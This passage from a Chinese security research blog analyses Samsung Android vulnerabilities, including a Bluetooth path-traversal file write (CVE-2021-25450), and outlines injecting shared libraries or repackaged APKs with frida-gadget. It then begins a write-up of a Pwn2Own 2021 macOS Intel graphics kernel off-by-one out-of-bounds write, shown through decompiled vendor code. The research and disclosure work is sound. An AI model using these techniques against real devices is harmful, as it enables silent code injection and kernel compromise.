class="string">&quot;com.samsung.android.provider.filterprovider.DELETE_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有了这个bug，就可以利用之前的bug来调用服务，得到一个直接的文件写入，覆盖任何文件。</p>
<h2 id="3-2-Samsung-FactoryAirCommandManager路径穿越"><a href="#3-2-Samsung-FactoryAirCommandManager路径穿越" class="headerlink" title="3.2 Samsung FactoryAirCommandManager路径穿越"></a>3.2 Samsung FactoryAirCommandManager路径穿越</h2><p>漏洞编号为CVE-2021-25450，并在2021年9月的三星安全公告中得到修复。</p>
<p>漏洞在<code>BluetoothSocketModule</code>模块中，它有两个子类<code>BluetoothClient</code> 和 <code>BluetoothServer</code>。该漏洞允许攻击者通过蓝牙<code>socket</code>发送文件到任意路径，最主要的是蓝牙的连接不需要用户同意。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startSocket</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">byte</span>[] newBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;startSocket&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.readSocket = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="built_in">this</span>.is, Charset.forName(<span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;readSocket&quot;</span>, <span class="string">&quot;readSocket: &quot;</span> + <span class="built_in">this</span>.readSocket);</span><br><span class="line">    <span class="built_in">this</span>.isRunning = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="built_in">this</span>.is.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (read == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (AirCommandManager.getInstance().getModeTo() == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isContinue) &#123;</span><br><span class="line">                <span class="built_in">this</span>.startTime = System.currentTimeMillis();</span><br><span class="line">                <span class="built_in">this</span>.isContinue = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Receive &quot;</span> + read + <span class="string">&quot; bytes: &quot;</span> + Support.Functions.byteArrayToHexString(buffer, read));</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isFileMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getFileSize += read;</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;getFileSize: &quot;</span> + <span class="built_in">this</span>.getFileSize);</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;file mode&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.fos.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">                <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.getFileSize &gt;= <span class="built_in">this</span>.fileLength) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end file mode&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">                    <span class="built_in">this</span>.fos.close();</span><br><span class="line">                    <span class="built_in">this</span>.getFileSize = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.isMetaMode) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(buffer, read);</span><br><span class="line">                <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str, <span class="literal">false</span>);</span><br><span class="line">                ACUtil.sendMessage(context, str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.arraycopy(buffer, <span class="number">0</span>, newBuffer, maxLength, read);</span><br><span class="line">                maxLength += read;</span><br><span class="line">                <span class="keyword">if</span> (newBuffer[maxLength - <span class="number">1</span>] == <span class="number">126</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG byte&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(fullBuffer);</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG str: &quot;</span> + str2);</span><br><span class="line">                    <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str2, <span class="literal">false</span>);</span><br><span class="line">                    ACUtil.sendMessage(context, str2);</span><br><span class="line">                    maxLength = <span class="number">0</span>;</span><br><span class="line">                    Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maxLength &gt; <span class="number">1</span> &amp;&amp; newBuffer[maxLength - <span class="number">2</span>] == <span class="number">13</span> &amp;&amp; newBuffer[maxLength - <span class="number">1</span>] == <span class="number">10</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;string&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer2 = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer2, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(fullBuffer2, <span class="number">0</span>, maxLength, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (str3.toUpperCase().contains(<span class="string">&quot;AT+FACMFILE&quot;</span>)) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.isFileMode = <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">subStr</span> <span class="operator">=</span> str3.substring(str3.indexOf(<span class="string">&quot;=&quot;</span>) + <span class="number">1</span>, str3.length() - <span class="number">2</span>);</span><br><span class="line">                        <span class="built_in">this</span>.fileName = subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                        <span class="built_in">this</span>.fileLength = Integer.parseInt(subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;name: &quot;</span> + <span class="built_in">this</span>.fileName + <span class="string">&quot; length: &quot;</span> + <span class="built_in">this</span>.fileLength);</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath);</span><br><span class="line">                        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                            file.mkdirs();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath + <span class="built_in">this</span>.fileName);</span><br><span class="line">                        ACUtil.log_d(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Save: &quot;</span> + file2.getPath());</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.fileLength != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file2);</span><br><span class="line">                            <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end string&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> str3 + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;str: &quot;</span> + str4);</span><br><span class="line">                        <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str4, <span class="literal">false</span>);</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            BluetoothService.mHandler.sendEmptyMessageDelayed(<span class="number">1000</span>, <span class="number">3000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.fos != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件路径是由蓝牙套接字流输入指定的，没有对路径进行检查，所以攻击者可以利用这一点来覆盖在<code>FactoryAirCommandManager</code>上下文中的任意文件。而且，这个程序拥有强制接受任何蓝牙配对请求的权限，因为<code>BluetoothService</code>的代码会自动检索并设置配对<code>PIN</code>码。这就使得攻击者可以悄悄地触发这个漏洞，而不需要欺骗用户手动确认蓝牙配对。</p>
<h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h1><p>可以注入的代码有两种类型：</p>
<ol>
<li><code>/data/app/A/lib</code>中的<code>so</code>文件；</li>
<li><code>/data/app/A/</code>中的<code>base.apk</code>。</li>
</ol>
<p>对于第一种类型，可以直接注入<code>so</code>，因为应用程序安装后，<code>PackageManagerService</code>就不会再对<code>so</code>进行检查了，直至应用程序卸载或完全更新。</p>
<p>对于第二种类型，思路是使用重打包的包来替换<code>base.apk</code>，这种方式较为灵活，可以绕过应用程序对动态库的校验，以及，对于没有库的应用程序也可以正常使用。这种方式的缺点是，<code>PackageManagerService</code>会在每一次重启后，重新校验应用程序，这个过程会导致失败，也就意味着，这种方式只能存活一次。</p>
<p>对于第一种类型，京东的思路是注入共享库，然后，应用程序启动并加载共享库，共享库再启动 <code>frida-gadget</code>，最后运行攻击脚本。同时，京东还使用了LIFE对应用程序原始的共享库进行注入，使用LIFE时需要注意的一点是，要在注入的文件中使用一个足够长的路径，因为Android会在安装路径中添加随机后缀。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/" class="post-title-link" itemprop="url">macOS Intel图形内核拓展RCE+EOP</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-01 21:59:36" itemprop="dateCreated datePublished" datetime="2022-07-01T21:59:36+08:00">2022-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-03 20:49:17" itemprop="dateModified" datetime="2022-07-03T20:49:17+08:00">2022-07-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近RET2放出了<a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2021/4/2/pwn2own-2021-schedule-and-live-results">Pwn2Own 2021</a>上的不少好东西，先是<a target="_blank" rel="noopener" href="https://www.parallels.com/">Parallels Desktop</a>的一个沙箱逃逸，然后就是这个macOS的RCE+EOP，都给了完整的利用代码，这不看一下实在是说不过去。</p>
<p>先上一下原文链接：<a target="_blank" rel="noopener" href="https://blog.ret2.io/2022/06/29/pwn2own-2021-safari-sandbox-intel-graphics-exploit/%E3%80%82">https://blog.ret2.io/2022/06/29/pwn2own-2021-safari-sandbox-intel-graphics-exploit/。</a></p>
<p>文章说“与英特尔图形相关的 CVE 在 Apple 的安全更新列表中变得越来越普遍”，依据之前看的Apple每月的安全更新来说，确实是这样，看来不管是什么系统，驱动都是很容易出问题的。</p>
<h1 id="IOKit-图形加速概述"><a href="#IOKit-图形加速概述" class="headerlink" title="IOKit 图形加速概述"></a>IOKit 图形加速概述</h1><p>与漏洞有关的两个内核驱动程序是：</p>
<ul>
<li><code>IOAcceleratorFamily2</code>：通用平台无关代码和类，例如<code>IOAccelContext2</code></li>
<li><code>AppleIntel*Graphics</code>：特定于硬件的代码和子类，例如<code>IGAccelGLContext</code></li>
</ul>
<p>加载的特定于硬件的内核拓展依赖于CPU代数：</p>
<ul>
<li><code>AppleIntelICLGraphics</code> 用于最新的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ice_Lake_(microprocessor)">Ice Lake</a> 硬件</li>
<li><code>AppleIntelKBLGraphics</code> 用于 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kaby_Lake">Kaby Lake</a>&#x2F;<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Coffee_Lake">Coffee Lake</a></li>
<li><code>AppleIntelSKLGraphics</code> 用于 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Skylake_(microarchitecture)">Skylake</a></li>
<li>……更老的东西</li>
</ul>
<p>这些驱动程序通过IOKIT向用户空间开放功能，一般来讲，驱动程序实现了3个部分：</p>
<ul>
<li>服务</li>
<li>用户客户端</li>
<li>外部方法</li>
</ul>
<p>想要与驱动通信的用户空间程序需要先获得这个服务的一个端口，驱动程序随后通过一个数字ID标识一个特定的用户客户端，然后就可以通过用户客户端调用外部方法，通过数字ID选择方法，根据需要传入标量和或二进制blob参数，外部方法可以认为是对内核驱动的RPC调用。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_iokit_diagram.png" alt="p2o_2021_eop_iokit_diagram"></p>
<p>与用户客户端交互的另一种常见方式是通过共享内存（在用户空间和内核之间）。</p>
<h1 id="IntelAccelerator-IOAccelerator"><a href="#IntelAccelerator-IOAccelerator" class="headerlink" title="IntelAccelerator&#x2F;IOAccelerator"></a>IntelAccelerator&#x2F;IOAccelerator</h1><p>在基于Intel的Mac上，图形加速服务的名称为<code>IntelAccelerator</code>，或者是<code>IOAccelerator</code>，渲染器&#x2F;<code>WebContent</code>沙盒明确<a target="_blank" rel="noopener" href="https://github.com/WebKit/WebKit/blob/4445bdf30face773b63e3effc38f7691896e0ddb/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in#L318">允许打开</a>这个服务，尽管<a target="_blank" rel="noopener" href="https://github.com/WebKit/WebKit/blob/4445bdf30face773b63e3effc38f7691896e0ddb/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in#L123">有一些代码</a>用于限制允许的用户客户端和外部方法。虽然Safari有一个单独的GPU进程，但<code>IOAccelerator</code>可以被<code>WebContent</code>沙盒配置文件所允许（截至编写时）。</p>
<p>为了了解<code>IOAccelerator</code>的可用攻击面，需要通过逆向工程来列举该服务的用户客户端，寻找一个重载的<code>newUserClient</code>函数。这个函数将在用户空间调用<code>IOServiceOpen</code>时被调用。</p>
<p><code>AppleIntelICLGraphics</code>没有实现<code>IntelAccelerator::newUserClient</code>，所以要看一下<code>IOAcceleratorFamily2</code>中实现的超类。在那里找到了 <code>IOGraphicsAccelerator2::newUserClient</code>，它包含了对输入<code>ID</code>的切换案例，给了一个可以创建的用户客户端的集合（每个都实现为一个C++类）。</p>
<p>可以为感兴趣的每个用户客户端寻找外部方法。查找每个类重写的以下函数之一：</p>
<ul>
<li><code>externalMethod</code></li>
<li><code>getTargetAndMethodForIndex</code></li>
<li><code>getAsyncTargetAndMethodForIndex</code></li>
</ul>
<p>这些函数中的每一个都会接受一个数字选择器来识别外部方法，并且会直接调用实现，或者返回一个包含相关信息的结构（例如，一个函数指针和参数类型&#x2F;数量）。最终调用这些内核函数的相应的用户空间API是<code>IOConnectCallMethod</code>系列函数。</p>
<p>还有一些陷阱函数，可以使用<code>IOConnectTrap</code>函数之一来调用。其各自被重写的内核函数是<code>getTargetAndTrapForIndex</code>和<code>getExternalTrapForIndex</code>。</p>
<p>一些用户客户端还提供了将共享内存映射到用户空间的<code>IOConnectMapMemory</code>。这些用户客户端覆盖了<code>clientMemoryForType</code>的内核函数。</p>
<h1 id="Inspecting-a-User-Client"><a href="#Inspecting-a-User-Client" class="headerlink" title="Inspecting a User Client"></a>Inspecting a User Client</h1><p>以<code>IntelAccelerator</code>服务的类型为6的用户客户端 <code>IGAccelSharedUserClient</code>（继承自 <code>IOAccelSharedUserClient2</code>）为例，查看外部方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOExternalMethod* IOAccelSharedUserClient2::getTargetAndMethodForIndex(..., unsigned int index) &#123;</span><br><span class="line">  if ( index &lt; 20 )</span><br><span class="line">    return &amp;IOAccelSharedUserClient2::sSharedMethods[index];</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在<code>data</code>区有一个外部方法的静态数组，这是常见的模式。</p>
<p> <code>IGAccelSharedUserClient</code>是一个用于排序以及创建多种供其他用户客户端使用的对象的一个帮助程序，一些外部方法如 <code>new_resource</code>， <code>create_shmem</code>， <code>allocate_fence_memory</code> 和 <code>set_resource_purgeable</code>。 创建的对象的 “命名空间 “可以通过用<code>IOConnectAddClient</code>连接另一个用户客户端以进行共享。</p>
<p><code>Resources</code> (也叫<code>textures</code>)，是由 <code>IGAccelResource</code>类表示的，这个类对利用来讲很有用，外部方法 <code>new_resource</code>创建一个用户指定属性的<code>resources</code> ，并将资源ID返回到用户空间，它还会将资源的后备缓冲区（用户指定大小）备份映射到进程地址空间中。</p>
<h1 id="Sideband-Buffers"><a href="#Sideband-Buffers" class="headerlink" title="Sideband Buffers"></a>Sideband Buffers</h1><p>有一些继承自 <code>IOAccelContext2</code>的用户客户端，这些<code>content</code>对象提供了一些类型的共享内存，类型0就是<code>Sideband Buffers</code>。</p>
<p><code>Sideband Buffers</code>可以通过外部方法2 （<code>IOAccelContext2::submit_data_buffers</code>）进行提交，这最终在<code>IOAccelContext2::processSidebandBuffer</code>中结束，它根据一个简单的二进制格式处理<code>Sideband Buffers</code>中的 “token”。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/p2o_2021_eop_sideband_format.svg" alt="p2o_2021_eop_sideband_format"></p>
<ul>
<li><code>token_id</code>，两个字节，一种操作码，将决定<code>Token Body</code>要如何处理；</li>
<li><code>token_size</code>，两个字节，<code>dowrd</code>表示的Token大小，即，一个有空<code>body</code>的<code>token</code>的大小为2.</li>
<li><code>db0_off</code>，表示进入 “数据缓冲区0 “的一个偏移。在这种情况下，数据缓冲区是一种特殊的资源类型（<code>IGAccelResource</code>）。一个操作码为0的令牌可以用来 “绑定 “数据缓冲区0；令牌<code>body</code>将包含需要绑定的资源ID。</li>
</ul>
<p>当迭代<code>Sideband Buffers</code>令牌时，一个辅助结构<code>IOAccelCommandStreamInfo</code>将包含描述命令流和当前令牌状态的某些字段。这为各种令牌处理程序访问公共字段提供了方便。字段<code>db0_ptr</code>，存储了一个进入数据缓冲区0的指针，在<code>db0_off</code>偏移。</p>
<p>函数<code>processSidebandBuffer</code>执行一些基本的边界检查，以确保<code>db0_off</code>和<code>token_size</code>不会太大，然后将<code>token</code>的处理推迟到一个虚拟方法<code>processSidebandToken</code>。</p>
<p>对于大多数的上下文对象来说，各种重载的实现都遵循类似的模式。如果上下文应该处理操作码，它就会传递给该操作码的令牌处理程序，否则它就推迟到超类的 <code>processSidebandToken</code> 函数。所有的令牌处理程序似乎都被统一命名为<code>process_token_*</code>，所以它们相对容易被列举出来。</p>
<h1 id="Out-Of-Bounds-Write-in-VPHAL-Handler"><a href="#Out-Of-Bounds-Write-in-VPHAL-Handler" class="headerlink" title="Out-Of-Bounds Write in VPHAL Handler"></a>Out-Of-Bounds Write in VPHAL Handler</h1><p>其中一个<code>IOAccelContext2</code>子类用户客户端：<code>IGAccelVideoContextMain</code>，有一个处理 <code>VPHAL </code>令牌的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">IGAccelVideoContextMain::process_token_VPHAL</span><span class="params">(</span></span><br><span class="line"><span class="params">        IGAccelVideoContextMain *this,</span></span><br><span class="line"><span class="params">        IOAccelCommandStreamInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* cur = info-&gt;sb_cur; <span class="comment">// current token</span></span><br><span class="line">    IGAccelVideoContextMain::patch_vphal_command_buffer(this, info, cur+<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">IGAccelVideoContextMain::patch_vphal_command_buffer</span><span class="params">(</span></span><br><span class="line"><span class="params">        IGAccelVideoContextMain *this,</span></span><br><span class="line"><span class="params">        IOAccelCommandStreamInfo *info,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> *sb)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// offset pointer into data buffer 0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* db0 = info-&gt;db0_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take a resource id from sb, get its &quot;gpu address&quot;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gpu_addr;</span><br><span class="line">    this-&gt;bind_resource(this, info, *sb&gt;&gt;<span class="number">16</span>, &amp;gpu_addr, ...);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get index from sb</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx = (*sb&gt;&gt;<span class="number">3</span>)&amp;<span class="number">0x7f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bounds check the index against dbuf0 base/length</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;db0[idx+<span class="number">1</span>] &lt;= info-&gt;dbuf0_base + info-&gt;dbuf0_size) &#123; <span class="comment">// &lt;--- [1]</span></span><br><span class="line">        <span class="comment">// write low/high 32 bits</span></span><br><span class="line">        db0[idx] = gpu_addr;</span><br><span class="line">        db0[idx+<span class="number">1</span>] = gpu_addr&gt;&gt;<span class="number">32</span>; <span class="comment">// &lt;--- [2]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[1]处的边界检查是<code>off-by-one</code>。它确保<code>db0[idx]</code>在数据缓冲区0的范围内，然而在[2]处对<code>db0[idx+1]</code>的写入可能是越界的。这就给了我们一个对资源缓冲区后的4个字节的<code>out-of-bounds</code>写原语。</p>
<p>虽然我们只能猜测，但这个bug可能是在GPU地址变成64位而不是32位时引入的，而边界检查并没有更新以匹配。</p>
